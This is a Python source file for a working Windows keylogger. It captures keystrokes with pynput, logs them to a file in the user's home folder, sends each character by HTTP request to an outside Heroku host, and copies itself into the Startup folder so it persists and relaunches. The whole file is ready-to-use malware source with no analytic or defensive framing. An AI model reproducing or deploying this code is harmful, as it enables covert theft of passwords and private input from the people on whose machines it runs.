import os
import re
import shutil
import subprocess
import sys
import threading
from pathlib import Path

import requests
from pynput.keyboard import Listener

line_length = 0
HOST = "https://salty-basin-28879.herokuapp.com/"


def launch_request(key):
    try:
        requests.get(f'{HOST}key?key={key}')
    except Exception as e:
        print(e)


def key_recorder(key):
    f = open(os.path.join(str(Path.home()), 'logger.txt'), 'a+')
    str_key = str(key)
    global line_length
    line_length += 1
    char = ""
    if line_length >= 50:
        char = "\n"
        line_length = 0
    if str_key == "Key.enter":
        char = '\n'
    elif str_key == "Key.space":
        char += " "
    elif str_key == "Key.backspace":
        char += " {del} "
        #     size = f.tell()  # the size...
        #     f.truncate(size - 1)
    elif len(re.findall(r'Key.([\w\d]+)', str_key)) > 0:
        if len(re.findall(r'Key.([\w\d]+)', str_key)[0]) > 1:
            return
    elif len(re.findall(r'(x[\d]+)', str_key)) > 0:
        return
    elif len(re.findall(r'<([\d]+)>', str_key)) > 0:
        if int(re.findall(r'<([\d]+)>', str_key)[0]) - 96 < 10:
            char += str(int(re.findall(r'<([\d]+)>', str_key)[0]) - 96)
        elif re.findall(r'<([\d]+)>', str_key)[0] == '110':
            char += '.'
    else:

        char += str_key.replace("'", "")
    print(char)
    f.write(char)
    t = threading.Thread(target=launch_request, args=(char,))
    t.start()


def copy_to_startup_folder():
    file_name = re.findall(r'([^\\w\d\W]+).(py|exe|pyw)', sys.argv[0])[0][0] + ".exe"
    try:
        src = sys.argv[0]
        dest = os.path.join(str(Path.home()), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu',
                            'Programs',
                            'Startup',
                            file_name)

        shutil.copy(src, dest)
        subprocess.Popen(dest, shell=False, stdin=None, stdout=None, stderr=None,
                         close_fds=True, creationflags=subprocess.DETACHED_PROCESS)

        return False
    except shutil.SameFileError:
        print('File is in startup folder')

        return True


if __name__ == '__main__':
    if '.exe' in sys.argv[0]:
        if copy_to_startup_folder():
            with Listener(on_press=key_recorder) as listener:
                listener.join()
